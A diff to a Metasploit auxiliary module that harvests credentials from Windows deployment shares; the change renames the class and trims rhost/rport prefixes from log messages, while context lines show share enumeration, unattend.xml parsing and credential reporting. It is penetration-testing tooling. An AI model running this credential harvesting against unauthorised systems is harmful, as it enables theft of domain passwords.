@@ -7,7 +7,7 @@ require 'msf/core'
 require 'rex/proto/dcerpc'
 require 'rex/parser/unattend'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::SMB::Client
   include Msf::Exploit::Remote::SMB::Client::Authenticated
@@ -60,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
     begin
       dcerpc_bind(handle)
     rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
-      print_error("#{rhost} : #{e.message}")
+      print_error(e.message)
       return
     end
 
@@ -148,7 +148,7 @@ class Metasploit3 < Msf::Auxiliary
         share_type = share[1]
 
         if share_type == "DISK" && (share_name == "REMINST" || share_comm == "MDT Deployment Share")
-          vprint_good("#{ip}:#{rport} Identified deployment share #{share_name} #{share_comm}")
+          vprint_good("Identified deployment share #{share_name} #{share_comm}")
           deploy_shares << share_name
         end
       end
@@ -164,12 +164,12 @@ class Metasploit3 < Msf::Auxiliary
 
   def query_share(share)
     share_path = "\\\\#{rhost}\\#{share}"
-    vprint_status("#{rhost}:#{rport} Enumerating #{share}...")
+    vprint_status("Enumerating #{share}...")
 
     begin
       simple.connect(share_path)
     rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
-      print_error("#{rhost}:#{rport} Could not access share: #{share} - #{e}")
+      print_error("Could not access share: #{share} - #{e}")
       return
     end
 
@@ -188,7 +188,7 @@ class Metasploit3 < Msf::Auxiliary
         next unless cred['password'].to_s.length > 0
 
         report_creds(cred['domain'].to_s, cred['username'], cred['password'])
-        print_good("#{rhost}:#{rport} Credentials: " +
+        print_good("Credentials: " +
           "Path=#{share_path}#{file_path} " +
           "Username=#{cred['domain'].to_s}\\#{cred['username'].to_s} " +
           "Password=#{cred['password'].to_s}"
@@ -238,7 +238,7 @@ class Metasploit3 < Msf::Auxiliary
   def loot_unattend(data)
     return if data.empty?
     path = store_loot('windows.unattend.raw', 'text/plain', rhost, data, "Windows Deployment Services")
-    print_status("#{rhost}:#{rport} Stored unattend.xml in #{path}")
+    print_status("Stored unattend.xml in #{path}")
   end
 
   def report_creds(domain, user, pass)
